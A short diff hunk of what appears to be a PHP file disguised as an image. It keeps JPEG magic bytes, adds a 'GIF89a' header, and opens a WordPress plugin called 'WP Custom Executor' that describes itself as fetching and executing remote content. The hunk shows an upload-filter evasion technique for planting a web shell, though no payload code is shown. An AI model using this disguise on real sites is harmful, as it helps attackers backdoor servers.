@@ -1,4 +1,6 @@
-����JFIF���������<?php
+����JFIF���������
+GIF89a;
+<?php
 /**
  * Plugin Name: WP Custom Executor
  * Description: A custom utility for fetching and executing remote content.
